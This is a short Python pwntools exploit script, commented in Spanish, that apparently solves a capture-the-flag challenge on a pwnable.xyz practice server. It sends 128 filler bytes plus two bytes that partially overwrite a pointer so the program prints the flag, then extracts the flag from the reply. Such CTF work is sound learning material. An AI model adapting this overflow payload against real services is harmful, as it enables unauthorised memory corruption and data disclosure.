#!/usr/bin/env python3

from pwn import *

# Idea: sobrescribir PARCIALMENTE el puntero en 0x601160
# Original: apunta a 0x601168 ("%s\n")
# Queremos: que apunte a 0x601080 (flag)

# 0x601168 = ... 68 11 60 (little endian, solo los bytes bajos)
# 0x601080 = ... 80 10 60

# Si sobrescribo solo el primer byte de 0x601160:
# 128 bytes + 1 byte (0x80)
# Cambiará de 0x601168 a 0x601180 (NO es lo que quiero)

# Necesito cambiar de 0x601168 a 0x601080
# En little endian:
# 0x601168 = 68 11 60 00 00 00 00 00
# 0x601080 = 80 10 60 00 00 00 00 00

# Diferencia en bytes:
# byte 0: 0x68 -> 0x80
# byte 1: 0x11 -> 0x10

# Si escribo exactamente 128 bytes + 0x80 + 0x10:
payload = b'A' * 128 + b'\x80\x10'

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

log.info("Enviando partial overwrite...")
conn.sendline(payload)

data = conn.recvall(timeout=3)
log.info(f"Respuesta:\n{data}")

if b'FLAG{' in data and b'the_real_flag' not in data:
    log.success("¡POSIBLE FLAG REAL!")
    start = data.find(b'FLAG{')
    end = data.find(b'}', start) + 1
    flag = data[start:end]
    log.success(f"FLAG: {flag.decode()}")
elif b'FLAG{' in data:
    log.info("Flag falsa encontrada")

conn.close()